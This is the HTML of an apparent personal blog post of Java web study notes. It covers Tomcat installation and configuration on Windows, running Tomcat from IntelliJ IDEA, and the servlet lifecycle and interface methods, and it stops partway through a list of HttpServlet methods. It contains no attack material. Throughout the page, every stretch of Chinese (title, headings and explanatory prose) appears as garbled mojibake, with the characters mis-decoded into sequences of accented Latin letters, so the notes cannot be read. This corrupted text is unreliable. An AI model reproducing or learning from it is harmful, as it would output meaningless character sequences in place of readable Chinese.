<!DOCTYPE html>
<html lang="en">

<!-- Head tag (contains Google-Analyticsã€Baidu-Tongji)-->
<head>
  <!-- Google Analytics -->
  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-V3C5GQ73TE"></script>
    <script type="text/javascript">
      window.dataLayer = window.dataLayer || [];

      function gtag() {
        dataLayer.push(arguments);
      }
      gtag('js', new Date());

      gtag('config', 'G-V3C5GQ73TE');
    </script>
  

  <!-- Baidu Tongji -->
  
    <script type="text/javascript">
      // Originial
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?x";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  <!-- Baidu Push -->
  
    <script>
      (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
      })();
    </script>
  

  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>

  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>

  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="description" content="Morouuçš„å¤§ç‹—çª â—&#39;â—¡&#39;â—"/>
  <meta name="keyword" content="Morouu,morouu"/>
  <link rel="shortcut icon" href="//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302341051.png"/>

  <!-- Place this tag in your head or just before your close body tag. -->
  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>

  
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css"/>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/beantech.min.css"/>

    <!-- Pygments Highlight CSS -->
    <link rel="stylesheet" href="/css/highlight.css"/>
    <link rel="stylesheet" href="/css/widget.css"/>
    <link rel="stylesheet" href="/css/rocket.css"/>
    <link rel="stylesheet" href="/css/signature.css"/>
    <link rel="stylesheet" href="/css/catalog.css"/>
    <link rel="stylesheet" href="/css/livemylife.css"/>

    
      <!-- wave start -->
      <link rel="stylesheet" href="/css/wave.css"/>
      <!-- wave end -->
    

    
      <!-- top start (article top hot config) -->
      <link rel="stylesheet" href="/css/top.css"/>
      <!-- top end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/scroll.css"/>
      <!-- ThemeColor end -->
    

    
      <!-- viewer start (Picture preview) -->
      <link rel="stylesheet" href="/css/viewer.min.css"/>
      <!-- viewer end -->
    

    
      <!-- Search start -->
      <link rel="stylesheet" href="/css/search.css"/>
      <!-- Search end -->
    

    
      <!-- ThemeColor start -->
      <link rel="stylesheet" href="/css/themecolor.css"/>
      <!-- ThemeColor end -->
    

    

    
  

  <!-- Custom Fonts -->
  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
  <!-- Hux change font-awesome CDN to qiniu -->
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->

  <!-- ga & ba script hoook -->
  <link rel="canonical" href="https://morblog.cc/posts/82715091/">
  <title>
    
      å­¦ä¹ ç¬”è®° - java-webå­¦ä¹ (ä¸€) - Morouuçš„å¤§ç‹—çª â—&#39;â—¡&#39;â—
    
  </title>
<meta name="generator" content="Hexo 5.4.0"></head>


<!-- hack iOS CSS :active style -->

	<body ontouchstart="" class="body--light body--light">


		<!-- ThemeColor -->
		
		<!-- ThemeColor -->
<style type="text/css">
  .body--light {
    --light-mode: none;
    --dark-mode: block;
  }
  .body--dark {
    --light-mode: block;
    --dark-mode: none;
  }
  i.mdui-icon.material-icons.light-mode {
    display: var(--light-mode);
  }
  i.mdui-icon.material-icons.dark-mode {
    display: var(--dark-mode);
  }
</style>
<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
  <i class="mdui-icon material-icons light-mode">î†¬</i>
  <i class="mdui-icon material-icons dark-mode">î§</i>
</div>
<script>
  //getCookieValue
  function getCookieValue(a) {
    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
    return b
      ? b.pop()
      : '';
  }
  let themeMode = 'light';
  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
    let dbody = document.body.classList;
    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
  }

  //setCookieValue
  var toggleBtn = document.querySelector(".toggle");
  toggleBtn.addEventListener("click", function () {
    var e = document.body.classList.contains("body--dark");
    var cookieString = e
      ? "dark"
      : "light";
    var exp = new Date();
    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3å¤©è¿‡æœŸ
    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
  });
</script>

		

		<!-- Gitter -->
		
		<!-- Gitter -->
<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
<script>
  ((window.gitter = {}).chat = {}).options = {
    room: 'dmantick/morcruiser'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

		

		<!-- Navigation (contains search)-->
		<!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header page-scroll">
      <button type="button" class="navbar-toggle">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">Morouuçš„å¤§ç‹—çª â—&#39;â—¡&#39;â—</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
    <div id="huxblog_navbar">
      <div class="navbar-collapse">
        <ul class="nav navbar-nav navbar-right">
          <li>
            <a href="/">é¦–é¡µ</a>
          </li>

          
          
          
          
          <li>
            <a href="/about/">
              
              å…³äº
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/tags/">
              
              æ ‡ç­¾
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/archive/">
              
              å½’æ¡£
              
              
            </a>
          </li>
          
          
          
          <li>
            <a href="/categories/">
              
              åˆ†ç±»
              
              
            </a>
          </li>
          
          

          
          <li>
            <a class="popup-trigger">
              <span class="search-icon"></span>æœç´¢</a>
          </li>
          

          <!-- LangSelect -->
          
          
          
          
          
        </ul>
      </div>
    </div>
    <!-- /.navbar-collapse -->
  </div>
  <!-- /.container -->
</nav>
<!-- progress -->
<div id="progress">
  <div class="line" style="width: 0%;"></div>
</div>

<script>
  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
  var $body = document.body;
  var $toggle = document.querySelector('.navbar-toggle');
  var $navbar = document.querySelector('#huxblog_navbar');
  var $collapse = document.querySelector('.navbar-collapse');

  $toggle.addEventListener('click', handleMagic)

  function handleMagic(e) {
    if ($navbar.className.indexOf('in') > 0) {
      // CLOSE
      $navbar.className = " ";
      // wait until animation end.
      setTimeout(function() {
        // prevent frequently toggle
        if ($navbar.className.indexOf('in') < 0) {
          $collapse.style.height = "0px"
        }
      }, 400)
    } else {
      // OPEN
      $collapse.style.height = "auto"
      $navbar.className += " in";
    }
  }
</script>


		<!-- Post Header (contains intro-headerã€signatureã€wordcountã€busuanziã€waveoverlay) -->
		<!-- Modified by Yu-Hsuan Yen -->
<!-- Post Header -->

  <style type="text/css">
    .body--light {
      /* intro-header */
      --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }
    .body--dark {
      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
    }

    header.intro-header {
       /*post*/
        background-image: var(--intro-header-background-image-url-post);
        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202242007633.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
      
    }

    
      #signature {/*signature*/
        background-image: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302343273.png');
      }
    
  </style>





<header class="intro-header">
  <!-- Signature -->
  <div id="signature">
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
          
          <div class="post-heading">
            <div class="tags">
              
              <a class="tag" href="/tags/#å®‰å…¨" title="å®‰å…¨">å®‰å…¨</a>
              
              <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
              
            </div>
            <h1>å­¦ä¹ ç¬”è®° - java-webå­¦ä¹ (ä¸€)</h1>
            <h2 class="subheading"></h2>
            <span class="meta">
              Posted by morouu on
              2022-02-24
            </span>


            
            <!-- WordCount start -->
            <div class="blank_box"></div>
            <span class="meta">
              Estimated Reading Time <span class="post-count" >70</span> Minutes
            </span>
            <div class="blank_box"></div>
            <span class="meta">
              Words <span class="post-count">14.8k</span> In Total
            </span>
            <div class="blank_box"></div>
            <!-- WordCount end -->
            
            
            <!-- ä¸è’œå­ç»Ÿè®¡ start -->
            <span class="meta" id="busuanzi_container_page_pv">
              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
            </span>
            <!-- ä¸è’œå­ç»Ÿè®¡ end -->
            


          </div>
          
        </div>
      </div>
    </div>
  </div>

  
  <!-- waveoverlay start -->
  <div class="preview-overlay">
    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
      <defs>
        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
      </defs>
      <g class="preview-parallax">
        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
      </g>
    </svg>
  </div>
  <!-- waveoverlay end -->
  

</header>



		<!-- Main Content (Post contains
	Pagerã€
	tipã€
	socialshareã€
	gitalkã€gitmentã€disqus-commentã€
	Catalogã€
	Sidebarã€
	Featured-Tagsã€
	Friends Blogã€
	anchorjsã€
	) -->
		<!-- Modify by Yu-Hsuan Yen -->
<!-- Post Content -->
<article>
  <div class="container" style="margin-left: 10%;">
    <div class="row">
      <!-- Post Container -->
      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">

        <h1>å­¦ä¹ ç¬”è®° - java-webå­¦ä¹ (ä¸€)</h1>
<h2 id="å‰è¨€">- å‰è¨€ -</h2>
<p>æ²¡å•¥æ°´å¹³çš„ç©æ„ï¼Œå°±å½“ä½œç»™è‡ªå·±å†™ç€ï¼Œä¾¿äºä»¥åç¿»çœ‹ã€‚</p>
<h2 id="ç¯å¢ƒæ­å»º">- ç¯å¢ƒæ­å»º -</h2>
<h3 id="tomcat">- tomcat -</h3>
<p>ä½œä¸ºä¸€ä¸ªå…è´¹å¼€æºçš„è½»é‡webåº”ç”¨æœåŠ¡å™¨ï¼Œ <code>tomcat</code> å¯ä»¥çœ‹ä½œæ˜¯ <code>Apache</code> æœåŠ¡å™¨çš„æ‰©å±•ï¼Œå¸¸ç”¨ä»¥ä½œä¸º <code>Servlet</code> å’Œ <code>JSP</code> å®¹å™¨ã€‚</p>
<h4 id="å®‰è£…">- å®‰è£… -</h4>
<p>è¿™æ˜¯æœ‰å…³åœ¨ <code>windows</code> ä¸­ <code>tomcat</code> çš„å®‰è£…ï¼Œå…ˆä»å®˜ç½‘ <a target="_blank" rel="noopener" href="https://tomcat.apache.org/">https://tomcat.apache.org/</a> ä¸‹è½½ï¼Œç„¶åè§£å‹åˆ°åˆé€‚çš„ç›®å½•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221717579.png" alt="image-20220222171726488"></p>
<h4 id="ç¯å¢ƒå˜é‡">- ç¯å¢ƒå˜é‡ -</h4>
<p>ç¡®ä¿ä»¥ä¸‹ç¯å¢ƒå˜é‡å¾—ä»¥é…ç½®ğŸ‘‡</p>
<ul>
<li><code>JAVA_HOME=C:\Java\jdk-11.0.12</code></li>
<li><code>CATALINA_HOME=F:\javaEnv\tomcat\apache-tomcat-9.0.58</code></li>
<li><code>CATALINA_BASE=F:\javaEnv\tomcat\apache-tomcat-9.0.58</code></li>
<li><code>CLASSPATH=F:\javaEnv\tomcat\apache-tomcat-9.0.58\lib\jsp-api.jar;F:\javaEnv\tomcat\apache-tomcat-9.0.58\lib\servlet-api.jar</code></li>
<li><code>PATH=C:\Java\jdk-11.0.12\bin;%PATH%</code></li>
</ul>
<h4 id="å¯åŠ¨-åœæ­¢">- å¯åŠ¨/åœæ­¢ -</h4>
<p>å…¶ä¸­åœ¨ <code>windows</code> ä¸‹å¼€å¯ <code>tomcat</code> æœåŠ¡éœ€è¿è¡Œ <code>bin\startup.bat</code> æ–‡ä»¶(è¿è¡Œ <code>bin\shutdown.bat</code> ä»¥å…³é—­)ï¼Œå›¾æ–¹ä¾¿ä¸”ä¸ºäº†èƒ½å…¼å®¹å¤šç§ç‰ˆæœ¬çš„ <code>tomcat</code> å¯ä»¥ç›´æ¥æ”¹ <code>startup.bat</code> æ–‡ä»¶ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221731760.png" alt="image-20220222173114694"></p>
<h4 id="é…ç½®">- é…ç½® -</h4>
<p>å¯ä»¥åœ¨ <code>lib\server.xml</code> ä¸­æ”¹ <code>tomcat</code> çš„é»˜è®¤ç«¯å£ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221733024.png" alt="image-20220222173320980"></p>
<p>æˆ–è€…æ›´æ”¹ä¸»æœºé…ç½®ï¼Œæ¯”å¦‚ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221743172.png" alt="image-20220222174353137"></p>
<p>å…¶ä¸­ <code>name</code> å€¼å¯ä»¥ä¸º <code>ip</code> æˆ–æ˜¯ <code>åŸŸå</code>ï¼Œå¦‚ä¸Šå›¾ <code>name</code> çš„å€¼ä¸º <code>localhost</code> ä¼šä» <code>hosts</code> è·å–å¯¹åº”çš„ <code>127.0.0.1</code> çš„ <code>ip</code> å› æ­¤å¯ä»¥é€šè¿‡ğŸ‘‡</p>
<ul>
<li><code>http://localhost:9058/</code></li>
<li><code>http://127.0.0.1:9058/</code></li>
</ul>
<p>ä»»æ„ä¸€ä¸ªè¿›è¡Œè®¿é—®ã€‚</p>
<p>ä½†å¦‚æœ <code>name</code> çš„å€¼ä¸º <code>127.0.0.1</code> éœ€è¦æ›´æ”¹ä»¥ä¸‹å†…å®¹ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221802509.png" alt="image-20220222180237433"></p>
<p>æ‰èƒ½å¤Ÿç”¨ <code>http://localhost:9058/</code> è¿›è¡Œè®¿é—®ã€‚</p>
<h3 id="IntelliJ-IDEA">- IntelliJ IDEA -</h3>
<p>ä¹‹æ‰€ä»¥ç”¨ <code>IntelliJ IDEA</code> å®Œå…¨æ˜¯å› ä¸ºæ‡’ <del>æœ‰æ­£ç‰ˆæˆæƒ</del> ã€‚</p>
<h4 id="é…ç½®tomcat">- é…ç½®tomcat -</h4>
<p>ä¾æ¬¡ç‚¹å‡» <code>File</code> =&gt; <code>settings</code> =&gt; <code>Build, Execution, Deployment</code> =&gt; <code>Application Servers</code> ï¼Œç„¶åå†ç‚¹ <code>+</code> æ·»åŠ  <code>Tomcat Server</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221817686.png" alt="image-20220222181734610"></p>
<p>ç¡®ä¿ç›®æ ‡è·¯å¾„æ˜¯æ­£ç¡®çš„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221818925.png" alt="image-20220222181825885"></p>
<p>ä¹‹åç‚¹å‡» <code>OK</code> ï¼Œåé¢çš„ <code>IntelliJ IDEA</code> æœºä¼šè‡ªåŠ¨è¡¥ä¸ŠğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221819729.png" alt="image-20220222181919654"></p>
<h4 id="æ–°å»ºé¡¹ç›®">- æ–°å»ºé¡¹ç›® -</h4>
<p>ä¾æ¬¡ç‚¹å‡» <code>File</code> =&gt; <code>New</code> =&gt; <code>Module...</code> =&gt; <code>Application Servers</code> ï¼Œ ç„¶åè¿›è¡Œè®¾ç½®ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221824832.png" alt="image-20220222182421753"></p>
<p>è®¾ç½®å¥½åç‚¹å‡» <code>Next</code> ï¼Œé€‰æ‹©éœ€è¦çš„ <code>Dependencies</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202221826902.png" alt="image-20220222182615814"></p>
<p>æœ€åç‚¹å‡» <code>Finish</code> å³å¯å®Œæˆé¡¹ç›®çš„æ–°å»ºã€‚</p>
<h4 id="è¿è¡Œ">- è¿è¡Œ -</h4>
<p>åœ¨ <code>IntelliJ IDEA</code> çš„å³ä¸Šè§’ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230910995.png" alt="image-20220223091036948"></p>
<p>ç‚¹å‡» <code>+</code> ç„¶åæ‰¾åˆ° <code>Tomcat Server</code> ï¼Œå¹¶é€‰æ‹© <code>Local</code>ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230911535.png" alt="image-20220223091111466"></p>
<p>æ–°å»ºå®Œæ¯•åå…ˆç‚¹å‡» <code>Deployment</code> å°†ä¸Šé¢æ–°å»ºçš„é¡¹ç›®çš„ <code>war</code> æ·»å…¥ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230911033.png" alt="image-20220223091143940"></p>
<p>é€‰æ‹©ä¸Šé¢æ–°å»ºçš„é¡¹ç›®ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230912428.png" alt="image-20220223091201366"></p>
<p>å†å›åˆ° <code>Server</code> è¿›è¡Œè®¾ç½®ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230914887.png" alt="image-20220223091456793"></p>
<p>åŒæ—¶æœ€å¥½æŠŠæŠŠè¿™ä¸¤ä¸ªé€‰äº†ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230916966.png" alt="image-20220223091657930"></p>
<p>è¿™æ ·åœ¨ <code>tomcat</code> è¿è¡Œæ—¶æ›´å˜ä»£ç ä¼šåŒæ­¥ã€‚</p>
<p>ç„¶åå¯ä»¥åœ¨ <code>WEB-INF</code> ç›®å½•æ–°å»ºä¸€ä¸ªç›®å½• ï¼Œç›®å½•åå¯ä»¥éšä¾¿èµ·ï¼Œæ¯”å¦‚ <code>lib</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230920779.png" alt="image-20220223092048740"></p>
<p>å†è®¾ç½®ä¸€ä¸‹ç»“æ„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230924940.png" alt="image-20220223092431854"></p>
<p>æœ€åç‚¹å‡»å³ä¸Šè§’çš„ <code>=&gt;</code> å³å¯ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230919607.png" alt="image-20220223091947466"></p>
<p>ç”±äºåœ¨ <code>IntelliJ IDEA</code> ä½¿ç”¨ <code>tomcat</code> å®è´¨æ˜¯å…ˆå°†å†™å¥½çš„é¡¹ç›®å…ˆæ‰“åŒ…æˆ <code>war</code> ï¼Œç„¶åæ”¾å…¥ <code>tomcat</code> åŠ è½½ï¼Œæ‰€ä»¥åƒæ˜¯ <code>web.xml</code>  æ˜¯ç‹¬ç«‹äº <code>tomcat</code> çš„é…ç½®è€Œåªä¸è¿™ä¸ªé¡¹ç›®ç›¸å…³ã€‚</p>
<h4 id="ç¯å¢ƒå˜é‡-2">- ç¯å¢ƒå˜é‡ -</h4>
<p>å¦å¤–ï¼Œåœ¨ <code>IntelliJ IDEA</code> çš„è¿è¡Œä¸­æ˜¯ç›´æ¥æ‰§è¡Œ <code>bin\catalina.bat</code> æ–‡ä»¶ï¼Œå®é™…ä¸Šåœ¨ <code>startup.bat</code> æœ€åä¹Ÿä¼šå¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ‰§è¡ŒğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230945014.png" alt="image-20220223094502882"></p>
<p>æ‰€ä»¥å¦‚æœè¦è‡ªå®šä¹‰ç›¸åº”çš„ç¯å¢ƒå˜é‡å¾—åˆ°ç›¸åº” <code>tomcat</code> çš„ <code>bin\catalina.bat</code> æ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œæˆ–æ˜¯æ›´æ”¹è¿è¡Œçš„ç¯å¢ƒå˜é‡ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202230958040.png" alt="image-20220223095815961"></p>
<h2 id="å†…å®¹">- å†…å®¹ -</h2>
<h3 id="servlet">- servlet -</h3>
<p><code>servlet</code> å³ <code>server applet</code> ï¼Œå…¨ç§°ä¸º <code>java servlet</code> ã€‚ä»åŠŸèƒ½ä¸Šæ¥çœ‹ï¼Œ<code>servlet</code> æ˜¯ä¸€ç§ç”¨ <code>java</code> ç¼–å†™çš„ï¼Œè¿è¡Œåœ¨æ”¯æŒ <code>java</code> è¯­è¨€æœåŠ¡å™¨ä¸Šçš„ç»„ä»¶ã€‚é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ª <code>servlet</code> æ˜¯æŒ‡æ‰€æœ‰å®ç°äº† <code>servlet</code> æ¥å£çš„ç±»ï¼Œ <code>servlet</code> å®¹å™¨ç”¨ä»¥ç®¡ç†å¤šä¸ª <code>servlet</code>ã€‚è€Œ <code>tomcat</code> å³æ˜¯å¯ä»¥å¯¹å¤šä¸ª <code>servlet</code> è¿›è¡Œç®¡ç†çš„å®¹å™¨ï¼Œè´Ÿè´£å°†å®¢æˆ·ç«¯çš„è¯·æ±‚åŒ…è£…åå‘é€ç»™å¯¹åº”çš„ <code>servlet</code> ï¼Œåœ¨ç”± <code>servlet</code> å¤„ç†å®Œæ¯•åå°†ç›¸åº”å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
<h4 id="ç”Ÿå‘½å‘¨æœŸ">- ç”Ÿå‘½å‘¨æœŸ -</h4>
<p><strong>â‘ [è£…è½½å’Œå®ä¾‹åŒ–]</strong> å½“æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå» <code>WEB-INF/web.xml</code> æ–‡ä»¶ä¸­è§£ææœ‰å…³ <code>servlet</code> çš„é…ç½®ï¼Œè£…è½½å„ä¸ª <code>servlet</code> ã€‚è‹¥è§£æåˆ°æŸä¸ª <code>servlet</code> æ‹¥æœ‰ <code>load-on-startup=1</code> é…ç½®æ—¶ï¼Œå°±ä¼šå°†è¯¥ <code>servlet</code> å®ä¾‹åŒ–ï¼›è€Œå¯¹æ²¡æœ‰ <code>load-on-startup=1</code> é…ç½®çš„ <code>servlet</code> åªæœ‰åœ¨å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶æ‰ä¼šå®ä¾‹åŒ–(è‹¥ <code>servlet</code> ä¸­å«æœ‰æ„é€ æ–¹æ³•ï¼Œåˆ™ä¼šåœ¨æ­¤æ—¶æ‰§è¡Œ)ã€‚</p>
<p><strong>â‘¡[åˆå§‹åŒ–]</strong> å½“ä¸€ä¸ª <code>servlet</code> è¢«å®ä¾‹åŒ–åï¼Œ<code>servlet</code> å®¹å™¨ä¼šå»è°ƒç”¨è¯¥ <code>servlet</code> å®ä¾‹çš„ <code>init()</code> æ–¹æ³•ã€‚</p>
<p><strong>â‘¢[æœåŠ¡]</strong> å½“å®¢æˆ·ç«¯è¿›è¡Œè¯·æ±‚æ—¶ï¼Œ<code>servlet</code> å®¹å™¨ä¼šå°†ä» <code>å®¢æˆ·ç«¯</code> å‘æ¥çš„ <code>http</code> è¯·æ±‚å°è£…æˆ <code>ServletRequest</code> å¯¹è±¡ï¼Œå¹¶å®ä¾‹åŒ–ä¸€ä¸ª <code>ServletResponse</code> å¯¹è±¡ç”¨ä½œå“åº”ï¼Œç„¶åå°†è¿™ä¸¤ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°å»è°ƒç”¨å¯¹åº” <code>servlet</code> çš„ <code>service()</code> æ–¹æ³•è¿›è¡Œå¤„ç†(è‹¥å¯¹åº”çš„ <code>servlet</code> æ²¡æœ‰è¢«å®ä¾‹åŒ–åˆ™åœ¨é¦–æ¬¡è¯·æ±‚æ—¶ä¼šå°†å¯¹åº”çš„ <code>servlet</code> å®ä¾‹åŒ–)ã€‚</p>
<p><strong>â‘£[é”€æ¯]</strong> å½“ <code>servlet</code> å®¹å™¨ä¸å†éœ€è¦æŸä¸ª <code>servlet</code> å®ä¾‹æ—¶ï¼Œä¼šè°ƒç”¨è¯¥ <code>servlet</code> å®ä¾‹çš„ <code>destroy()</code> æ–¹æ³•ã€‚</p>
<h4 id="ä»£ç ">- ä»£ç  -</h4>
<p>åœ¨ <code>servlet</code> è¿™ä¸ªæ¥å£ä¸­å®šä¹‰äº†ä»¥ä¸‹æ–¹æ³•ğŸ‘‡</p>
<ul>
<li><code>public void init(ServletConfig config) throws ServletException</code></li>
<li><code>public ServletConfig getServletConfig()</code></li>
<li><code>public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException</code></li>
<li><code>public String getServletInfo()</code></li>
<li><code>public void destroy()</code></li>
</ul>
<p>å…¶ä¸­ <code>GenericServlet</code> ç±»å®ç°äº† <code>servlet</code> æ¥å£ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231016467.png" alt="image-20220223101655370"></p>
<p>è€Œ <code>HttpServlet</code> ç±»ç»§æ‰¿äº† <code>GenericServlet</code> ç±»ï¼Œå¹¶å¯¹ <code>service</code> æ–¹æ³•åšäº†ä¸€ä¸ªåŒ…è£…ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202231018598.png" alt="image-20220223101837442"></p>
<p>ä¼šé€šè¿‡åˆ¤æ–­å®¢æˆ·ç«¯çš„è¯·æ±‚æ–¹æ³•æ¥è°ƒç”¨è‡ªèº«çš„ä»¥ä¸‹æ–¹æ³•ğŸ‘‡</p>
<ul>
<li><code>doGet</code></li>
